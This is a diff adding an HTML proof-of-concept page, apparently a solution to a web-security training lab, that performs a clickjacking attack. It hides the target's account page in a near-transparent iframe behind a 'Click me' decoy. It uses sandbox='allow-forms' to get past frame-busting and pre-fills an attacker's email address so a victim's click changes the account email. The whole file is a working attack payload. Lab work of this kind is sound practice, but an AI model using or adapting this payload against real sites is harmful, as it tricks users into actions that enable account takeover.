@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<!-- DSTRIKE Lab PoC: clickjacking-lab-03.html (Frame buster bypass via sandbox="allow-forms") -->
+<html>
+<head>
+  <style>
+    iframe { position: relative; width: 700px; height: 600px; opacity: 0.0001; z-index: 2; }
+    div.decoy { position: absolute; top: 450px; left: 80px; z-index: 1; }
+  </style>
+</head>
+<body>
+  <div class="decoy">Click me</div>
+  <iframe sandbox="allow-forms" src="https://TARGET-LAB-ID.web-security-academy.net/my-account?email=hacker@attacker-user.net"></iframe>
+</body>
+</html>
